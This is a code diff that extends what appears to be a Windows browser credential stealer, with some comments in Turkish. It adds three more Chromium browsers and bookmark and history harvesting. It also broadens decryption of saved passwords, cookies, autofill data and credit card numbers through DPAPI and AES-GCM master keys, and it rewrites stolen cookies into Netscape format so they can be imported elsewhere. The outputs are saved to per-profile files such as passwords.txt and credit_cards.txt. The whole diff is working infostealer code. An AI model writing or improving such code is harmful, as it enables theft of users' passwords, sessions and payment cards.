@@ -79,7 +79,7 @@ BROWSERS = {
         'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
         'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
         'process_name': 'browser.exe',
-        'key_name': 'Yandexkey1',
+        'key_name': 'Yandex Browserkey1',
         'chromium_based': True
     },
     'vivaldi': {
@@ -152,6 +152,30 @@ BROWSERS = {
         'local_state': r'AppData\Local\Kometa\User Data\Local State',
         'process_name': 'kometa.exe',
         'key_name': 'Kometakey1',
+        'chromium_based': True
+    },
+    'coccoc': {
+        'name': 'CocCoc Browser',
+        'data_path': r'AppData\Local\CocCoc\Browser\User Data',
+        'local_state': r'AppData\Local\CocCoc\Browser\User Data\Local State',
+        'process_name': 'browser.exe',
+        'key_name': 'CocCoc Browserkey1',
+        'chromium_based': True
+    },
+    'qq': {
+        'name': 'QQ Browser',
+        'data_path': r'AppData\Local\Tencent\QQBrowser\User Data',
+        'local_state': r'AppData\Local\Tencent\QQBrowser\User Data\Local State',
+        'process_name': 'QQBrowser.exe',
+        'key_name': 'QQ Browserkey1',
+        'chromium_based': True
+    },
+    '360speed': {
+        'name': '360 Speed',
+        'data_path': r'AppData\Local\360Chrome\Chrome\User Data',
+        'local_state': r'AppData\Local\360Chrome\Chrome\User Data\Local State',
+        'process_name': '360chrome.exe',
+        'key_name': '360 Speedkey1',
         'chromium_based': True
     },
     'firefox': {
@@ -293,29 +317,92 @@ def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
 
 def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
     try:
-        if not encrypted_value or encrypted_value[:3] != b'v20':
-            return "NOT_V20"
-        iv = encrypted_value[3:15]
-        payload = encrypted_value[15:-16]
-        tag = encrypted_value[-16:]
-        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
-        decrypted = cipher.decrypt_and_verify(payload, tag)
-        return decrypted[32:].decode('utf-8', errors='replace')
+        if not encrypted_value:
+            return ""
+        if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
+            try:
+                iv = encrypted_value[3:15]
+                payload = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                decrypted = cipher.decrypt_and_verify(payload, tag)
+                return decrypted[32:].decode('utf-8', errors='replace')
+            except:
+                # Fallback to standard DPAPI if AES-GCM fails (common for v10)
+                if encrypted_value[:3] == b'v10':
+                    return windows.crypto.dpapi.unprotect(encrypted_value[3:]).decode('utf-8', errors='replace')
+        return "DECRYPT_FAILED"
     except:
         return "DECRYPT_FAILED"
 
 def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
     try:
-        if not encrypted_value or encrypted_value[:3] != b'v20':
-            return "NOT_V20"
-        iv = encrypted_value[3:15]
-        payload = encrypted_value[15:-16]
-        tag = encrypted_value[-16:]
-        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
-        decrypted = cipher.decrypt_and_verify(payload, tag)
-        return decrypted.decode('utf-8', errors='replace')
+        if not encrypted_value:
+            return ""
+        if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
+            try:
+                iv = encrypted_value[3:15]
+                payload = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                decrypted = cipher.decrypt_and_verify(payload, tag)
+                return decrypted.decode('utf-8', errors='replace')
+            except:
+                # Fallback to standard DPAPI if AES-GCM fails (common for v10)
+                if encrypted_value[:3] == b'v10':
+                    return windows.crypto.dpapi.unprotect(encrypted_value[3:]).decode('utf-8', errors='replace')
+        return "NOT_V20_OR_V10"
     except:
         return "DECRYPT_FAILED"
+
+def extract_bookmarks(profile_path):
+    bookmarks_path = profile_path / "Bookmarks"
+    if not bookmarks_path.exists():
+        return []
+    try:
+        with open(bookmarks_path, "r", encoding="utf-8", errors='ignore') as f:
+            data = json.load(f)
+        bookmarks = []
+        def process_node(node):
+            if isinstance(node, dict):
+                if node.get("type") == "url":
+                    bookmarks.append(f"{node.get('name', 'Unknown')}\t{node.get('url', 'Unknown')}")
+                if "children" in node:
+                    for child in node["children"]:
+                        process_node(child)
+        if "roots" in data:
+            for root in data["roots"].values():
+                process_node(root)
+        return bookmarks
+    except:
+        return []
+
+def extract_history(profile_path):
+    history_db = profile_path / "History"
+    if not history_db.exists():
+        return []
+    db_copy = fetch_sqlite_copy(history_db)
+    if not db_copy:
+        return []
+    try:
+        con = sqlite3.connect(str(db_copy))
+        cur = con.cursor()
+        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
+        rows = cur.fetchall()
+        con.close()
+        os.unlink(db_copy)
+        history_items = []
+        for url, title, visit_count, last_visit in rows:
+            # Simple conversion for chrome time
+            try:
+                dt = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(last_visit/1000000 - 11644473600))
+            except:
+                dt = "Unknown"
+            history_items.append(f"{url}\t{title}\t{visit_count}\t{dt}")
+        return history_items
+    except:
+        if db_copy.exists(): os.unlink(db_copy)
+        return []
 
 def fetch_sqlite_copy(db_path: pathlib.Path):
     if not db_path.exists():
@@ -382,16 +469,32 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
     if not data_path.exists():
         return
 
-    # Tüm profil klasörlerini al
-    profiles = [p for p in data_path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile ") or "profile" in p.name.lower())]
-
-    # Opera/Opera GX fallback: Eğer profil klasörü bulunamazsa ve ana dizinde Login Data varsa, ana dizini profil say
+    # Profil tarama logicini iyileştir
+    potential_profiles = [p for p in data_path.iterdir() if p.is_dir()]
+    profiles = []
+    
+    # Gerçek profil klasörlerini tespit et (Login Data veya Cookies barındıranlar)
+    valid_indicators = ["Login Data", "Web Data", "Cookies", "History", "Network"]
+    for p in potential_profiles:
+        if p.name == "Default" or p.name.startswith("Profile") or any((p / ind).exists() for ind in valid_indicators):
+            profiles.append(p)
+    
+    # Fallback: Eğer hiç profil bulunamadıysa ama ana dizinde Login Data varsa
     if not profiles and (data_path / "Login Data").exists():
         profiles = [data_path]
 
     for profile_dir in profiles:
         profile_name = profile_dir.name
         prefix = f"{browser_name}/{profile_name}/"
+
+        # Bookmarks & History
+        bookmarks = extract_bookmarks(profile_dir)
+        if bookmarks:
+            write_to_file(base_path, prefix + "bookmarks.txt", "# Name\tURL\n" + "\n".join(bookmarks))
+        
+        history = extract_history(profile_dir)
+        if history:
+            write_to_file(base_path, prefix + "history.txt", "# URL\tTitle\tVisit Count\tLast Visit\n" + "\n".join(history))
 
         # Passwords
         passwords_content = ""
@@ -402,49 +505,31 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                 try:
                     con = sqlite3.connect(str(tmp_db))
                     cur = con.cursor()
-                    cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0")
-                    rows = cur.fetchall()
-                    
-                    # Sadece dolu password'ları işle
-                    for url, user, pw in rows:
-                        # v20 encryption (Chrome 80+)
-                        if pw[:3] == b'v20':
-                            dec = decrypt_v20_password(pw, master_key)
-                            if dec and dec != "DECRYPT_FAILED" and dec != "NOT_V20":
-                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                        # v10 encryption (older Chrome versions - DPAPI)
-                        elif pw[:3] == b'v10':
-                            try:
-                                dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
-                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                            except:
-                                pass
-                        # Unencrypted (very old versions)
-                        else:
-                            try:
-                                dec = pw.decode('utf-8', errors='replace')
-                                if dec:
+                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    for url, user, pw in cur.fetchall():
+                        if pw:
+                            if pw[:3] in (b'v10', b'v11', b'v20'):
+                                dec = decrypt_v20_password(pw, master_key)
+                                if dec and dec not in ("DECRYPT_FAILED", "NOT_V20_OR_V10"):
                                     passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                            except:
-                                pass
-                    
+                            elif pw[:3] == b'v10' and not master_key: # Legacy DPAPI
+                                try:
+                                    dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
+                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                                except: pass
                     con.close()
-                    
-                    # Sadece gerçek password varsa dosya oluştur
                     if passwords_content.strip():
                         write_to_file(base_path, prefix + "passwords.txt", passwords_content)
-                    
-                except:
-                    pass
-                
-                try:
-                    os.unlink(tmp_db)
-                except:
-                    pass
+                except: pass
+                if tmp_db.exists(): os.unlink(tmp_db)
 
         # Cookies
         cookies_content = ""
+        # Check both Network/Cookies and root Cookies
         cookies_db = profile_dir / "Network" / "Cookies"
+        if not cookies_db.exists():
+            cookies_db = profile_dir / "Cookies"
+            
         if cookies_db.exists():
             tmp_db = fetch_sqlite_copy(cookies_db)
             if tmp_db:
@@ -453,22 +538,22 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                     cur = con.cursor()
                     cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
                     for host, name, path, exp, sec, httpo, enc in cur.fetchall():
-                        if enc and enc[:3] == b'v20':
+                        if enc and enc[:3] in (b'v10', b'v11', b'v20'):
                             dec = decrypt_v20_value(enc, master_key)
                             if dec and dec != "DECRYPT_FAILED":
-                                line = f"{host}\tTRUE\t{path}\t{str(bool(sec)).upper()}\t{exp}\t{name}\t{dec}\n"
+                                # Netscape format
+                                flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
+                                secure_str = "TRUE" if sec else "FALSE"
+                                try:
+                                    unix_exp = int(exp) // 1000000 - 11644473600 if int(exp) > 11644473600*1000000 else 0
+                                except: unix_exp = 0
+                                line = f"{host}\t{flag}\t{path}\t{secure_str}\t{unix_exp}\t{name}\t{dec}\n"
                                 cookies_content += line
                     con.close()
-                    
                     if cookies_content.strip():
-                        write_to_file(base_path, prefix + "cookies.txt", cookies_content)
-
-                except:
-                    pass
-                try: 
-                    os.unlink(tmp_db)
-                except: 
-                    pass
+                        write_to_file(base_path, prefix + "cookies.txt", "# Netscape HTTP Cookie File\n" + cookies_content)
+                except: pass
+                if tmp_db.exists(): os.unlink(tmp_db)
         
         # Credit Cards & Autofill
         autofill_content = ""
@@ -478,45 +563,31 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
             tmp_db = fetch_sqlite_copy(webdata_db)
             if tmp_db:
                 try:
-                    con = sqlite3.connect(tmp_db)
+                    con = sqlite3.connect(str(tmp_db))
                     cur = con.cursor()
-                    
-                    # Autofill
                     try:
                         cur.execute("SELECT name, value FROM autofill")
                         for name, val in cur.fetchall():
                             if name:
-                                if isinstance(val, bytes) and val[:3] == b'v20':
+                                if isinstance(val, bytes) and val[:3] in (b'v10', b'v11', b'v20'):
                                     dec = decrypt_v20_value(val, master_key)
-                                else:
-                                    dec = str(val) if val else ""
+                                else: dec = str(val) if val else ""
                                 autofill_content += f"Field: {name}\nValue: {dec}\n\n"
                     except: pass
-                    
-                    # Credit Cards
                     try:
                         cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                         for name, exp_m, exp_y, enc_num in cur.fetchall():
                             dec_num = "Unknown"
-                            if enc_num and enc_num[:3] == b'v20':
-                                dec_num = decrypt_v20_password(enc_num, master_key) # Use password decrypt for CC
-                            
+                            if enc_num and enc_num[:3] in (b'v10', b'v11', b'v20'):
+                                dec_num = decrypt_v20_password(enc_num, master_key)
                             credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
                     except: pass
-
                     con.close()
-                    
-                    if autofill_content:
-                        write_to_file(base_path, prefix + "auto_fills.txt", autofill_content)
-                    if credit_cards_content:
-                        write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
-
-                except:
-                    pass
-                try: 
-                    os.unlink(tmp_db)
-                except: 
-                    pass
+                    if autofill_content: write_to_file(base_path, prefix + "auto_fills.txt", autofill_content)
+                    if credit_cards_content: write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
+                except: pass
+                if tmp_db.exists(): os.unlink(tmp_db)
+            pass
 
 def process_firefox_browser(browser_name, config, base_path):
     user_profile = os.environ['USERPROFILE']
